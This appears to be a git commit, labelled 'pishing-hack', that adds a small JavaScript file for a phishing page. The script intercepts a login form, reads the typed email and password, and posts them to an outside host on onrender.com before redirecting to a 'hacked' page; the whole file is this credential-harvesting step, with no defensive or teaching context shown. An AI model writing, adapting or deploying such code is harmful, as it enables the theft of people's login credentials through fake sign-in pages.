ad06bc278dbb2ce2dccb7653d7eb7991bc90c47a
aaquinonez01 <aaquinonez280801@gmail.com>
2023-12-10 13:33:48 -0500

    pishing-hack

---
+++ srcript.js
@@ -0,0 +1,19 @@
+document.querySelector("#form_hack").addEventListener("submit", (event) => {
+    event.preventDefault();
+
+    const username = document.getElementById("email").value;
+    const password = document.getElementById("pass").value;
+
+    fetch("http://pishing-hack-project.onrender.com/api/v1/users", {
+        method:"POST", 
+        body: JSON.stringify({username, password})
+    }).then((resp)=>{
+        resp.json().then((data)=>{
+            console.log(data);
+            window.location.href = "./hacked.html";
+        })
+    })
+
+
+    
+});
